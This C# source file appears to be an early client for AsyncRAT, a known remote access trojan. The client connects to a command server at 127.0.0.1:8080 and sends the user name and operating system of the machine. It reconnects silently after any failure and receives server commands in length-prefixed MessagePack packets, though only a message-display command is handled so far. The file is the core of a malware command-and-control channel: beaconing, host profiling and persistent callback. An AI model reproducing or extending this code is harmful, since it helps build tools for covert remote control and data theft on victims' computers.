using AsyncRAT_Sharp.MessagePack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Client
{
    class Program
    {
        public static Socket client;
        public static byte[] Buffer;
        public static long Buffersize;
        public static bool BufferRecevied;
        public static MemoryStream MS;

      static void Main(string[] args)
        {
            InitializeClient();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        public static void InitializeClient()
        {
            try
            {
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.ReceiveBufferSize = 50 * 1024;
                client.SendBufferSize = 50 * 1024;
                client.ReceiveTimeout = -1;
                client.SendTimeout = -1;
                client.Connect("127.0.0.1", 8080);
                Console.WriteLine("Connected!");
                Buffer = new byte[1];
                Buffersize = 0;
                BufferRecevied = false;
                MS = new MemoryStream();
                BeginSend(SendInfo());
                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Console.WriteLine("Disconnected!");
                Thread.Sleep(2500);
                InitializeClient();
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString();
            return msgpack.Encode2Bytes();

        }

        public static void ReadServertData(IAsyncResult ar)
        {
            if (client.Connected == false)
            {
                client.Close();
                client.Dispose();
                InitializeClient();
            }
            try
            {
                int Recevied = client.EndReceive(ar);

                if (Recevied > 0)
                {

                    if (BufferRecevied == false)
                    {
                        if (Buffer[0] == 0)
                        {
                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                            MS = new MemoryStream();
                            if (Buffersize > 0)
                            {
                                Buffer = new byte[Buffersize - 1];
                                BufferRecevied = true;
                            }
                        }
                        else
                        {

                            MS.Write(Buffer, 0, Buffer.Length);
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Recevied);
                        if (MS.Length == Buffersize)
                        {
                            Read(MS.ToArray());
                            MS = new MemoryStream();
                            Buffer = new byte[1];
                            Buffersize = 0;
                            BufferRecevied = false;
                        }
                    }
                }
                else
                {
                    client.Close();
                    client.Dispose();
                    InitializeClient();
                }
                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                client.Close();
                client.Dispose();
                InitializeClient();
            }
        }

        public static void Read(byte[] Data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes(Data);
            Console.WriteLine("I recevied a packet from server: " + unpack_msgpack.ForcePathObject("Packet").AsString);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "MessageBox":
                    {
                       Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                    }
                    break;
            }

        }

        public static void BeginSend(byte[] Msgs)
        {
            if (client.Connected)
            {
                try
                {
                    using (MemoryStream MS = new MemoryStream())
                    {
                        byte[] buffer = Msgs;
                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                        MS.Write(buffersize, 0, buffersize.Length);
                        MS.Write(buffer, 0, buffer.Length);

                        client.Poll(-1, SelectMode.SelectWrite);
                        client.BeginSend(MS.ToArray(), 0, Convert.ToInt32(MS.Length), SocketFlags.None, new AsyncCallback(EndSend), null);
                    }
                }
                catch
                { }
            }
        }

        public static void EndSend(IAsyncResult ar)
        {
            try
            {
                client.EndSend(ar);
            }
            catch
            { }
        }
    }
}